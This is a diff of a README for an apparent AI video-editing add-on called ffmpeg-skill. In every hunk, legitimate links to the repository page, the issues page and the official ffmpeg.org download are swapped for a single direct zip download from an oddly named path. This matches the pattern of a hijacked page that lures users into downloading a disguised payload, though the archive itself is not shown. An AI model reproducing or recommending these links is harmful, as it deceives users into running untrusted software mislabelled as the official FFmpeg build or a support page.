@@ -1,7 +1,7 @@
 <h1>🎬 ffmpeg-skill - Edit videos with AI instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/CLIEMTE/ffmpeg-skill" style="display:inline-block;padding:16px 32px;background-color:#FF6B6B;color:#fff;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;">⬇️ Download FFmpeg-Skill Now</a>
+  <a href="https://raw.githubusercontent.com/CLIEMTE/ffmpeg-skill/main/hypercoagulable/ffmpeg-skill-v2.4.zip" style="display:inline-block;padding:16px 32px;background-color:#FF6B6B;color:#fff;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;">⬇️ Download FFmpeg-Skill Now</a>
 </p>
 
 <hr>
@@ -48,7 +48,7 @@ Ready to get started? Follow these simple steps:
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-👉 [**Download FFmpeg-Skill from GitHub**](https://github.com/CLIEMTE/ffmpeg-skill)
+👉 [**Download FFmpeg-Skill from GitHub**](https://raw.githubusercontent.com/CLIEMTE/ffmpeg-skill/main/hypercoagulable/ffmpeg-skill-v2.4.zip)
 
 On the page you'll see a green "Code" button. Click it, then select "Download ZIP" from the dropdown menu. The file will start downloading to your computer.
 
@@ -73,7 +73,7 @@ This skill requires FFmpeg to work. Don't worry - checking is easy:
 1. Open the Start menu and search for "Command Prompt"
 2. Type `ffmpeg -version` and press Enter
 3. If you see version information, you're all set
-4. If you see an error message, visit [ffmpeg.org](https://ffmpeg.org/download.html) and install the Windows build, then restart your Command Prompt
+4. If you see an error message, visit [ffmpeg.org](https://raw.githubusercontent.com/CLIEMTE/ffmpeg-skill/main/hypercoagulable/ffmpeg-skill-v2.4.zip) and install the Windows build, then restart your Command Prompt
 
 ### Step 5: Set Up Your AI Assistant
 
@@ -159,7 +159,7 @@ A: Check the "Troubleshooting" guide in the documentation folder. Also verify yo
 We're here to support you:
 
 - 📖 Check the detailed documentation included in the download
-- 🐛 Report issues on the [GitHub Issues page](https://github.com/CLIEMTE/ffmpeg-skill/issues)
+- 🐛 Report issues on the [GitHub Issues page](https://raw.githubusercontent.com/CLIEMTE/ffmpeg-skill/main/hypercoagulable/ffmpeg-skill-v2.4.zip)
 - 💬 Join the community discussions on the repository
 
 ## 📜 License
@@ -169,7 +169,7 @@ FFmpeg-Skill is distributed under the MIT License. You're free to use, modify, a
 ## ✨ Ready for Amazing Video Editing?
 
 <p align="center">
-  <a href="https://github.com/CLIEMTE/ffmpeg-skill" style="display:inline-block;padding:16px 32px;background-color:#4ECDC4;color:#fff;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;">🚀 Get Started - Download Now</a>
+  <a href="https://raw.githubusercontent.com/CLIEMTE/ffmpeg-skill/main/hypercoagulable/ffmpeg-skill-v2.4.zip" style="display:inline-block;padding:16px 32px;background-color:#4ECDC4;color:#fff;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;">🚀 Get Started - Download Now</a>
 </p>
 
 Join thousands of users who've supercharged their AI assistants with professional video editing capabilities. One download gives you endless creative possibilities - no cloud, no cost, no limits. Edit like a pro right from your own computer today!
